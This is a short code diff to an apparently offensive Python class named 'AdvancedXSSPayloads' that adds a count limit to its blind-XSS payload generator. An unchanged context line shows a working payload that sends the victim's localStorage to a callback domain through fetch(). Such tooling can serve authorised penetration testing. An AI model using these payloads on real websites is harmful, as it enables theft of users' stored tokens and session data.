@@ -175,7 +175,7 @@ class AdvancedXSSPayloads:
         
         return obfuscated_payloads
     
-    def generate_blind_xss_payloads(self, callback_domain='burpcollaborator.net'):
+    def generate_blind_xss_payloads(self, callback_domain='burpcollaborator.net', count=10):
         """Génère des payloads pour blind XSS"""
         blind_payloads = []
         
@@ -198,7 +198,7 @@ class AdvancedXSSPayloads:
             f'<script>fetch("http://{callback_domain}/?storage="+encodeURIComponent(JSON.stringify(localStorage)))</script>'
         ])
         
-        return blind_payloads
+        return blind_payloads[:count]
     
     def generate_dom_xss_payloads(self):
         """Génère des payloads pour DOM XSS"""
